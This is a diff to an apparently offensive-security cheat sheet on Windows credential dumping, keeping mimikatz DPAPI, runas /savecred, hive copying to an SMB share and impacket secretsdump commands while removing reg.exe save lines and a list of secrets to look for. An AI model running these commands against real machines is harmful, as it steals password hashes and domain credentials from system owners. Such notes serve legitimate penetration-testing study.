@@ -235,7 +235,8 @@ Requires Domain Admin or replication rights. Extract a specific user's hash from
 ## DPAPI&#x20;
 
 * Credit for below section:
-* [https://hunter2.gitbook.io/darthsidious/privilege-escalation/mimikatz](https://hunter2.gitbook.io/darthsidious/privilege-escalation/mimikatz)
+* [https://hunter2.gitbook.io/darthsidious/privilege-escalation/mimikatz
+  ](https://hunter2.gitbook.io/darthsidious/privilege-escalation/mimikatz)
 
 ```
 mimikatz # sekurlsa::dpapi
@@ -326,13 +327,6 @@ runas /savecred /user:SRV01\mcharles cmd
 ## SAM / SYSTEM / SECURITY Hive Extraction
 
 ### Copy Registry Hives
-
-```
-reg.exe save hklm\sam C:\sam.save
-reg.exe save hklm\system C:\system.save
-reg.exe save hklm\security C:\security.save
-```
-
 Hive purposes: SAM = password hashes, SYSTEM = boot key to decrypt SAM, SECURITY = cached domain creds + DPAPI keys.
 
 If remote SMB/RPC dumping is blocked by host firewall rules, save the hives locally from an elevated shell and transfer them back over an existing shell, RDP drive mount, HTTP upload/download, or Meterpreter:
@@ -360,5 +354,3 @@ move system.save \\10.10.15.16\CompData
 ```
 python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam sam.save -security security.save -system system.save LOCAL
 ```
-
-Useful output to review: local SAM NTLM hashes, cached domain logons (`$DCC2$`), `$MACHINE.ACC`, `DefaultPassword`, `DPAPI_SYSTEM`, `NL$KM`, and service secrets such as `_SC_ServiceName`.
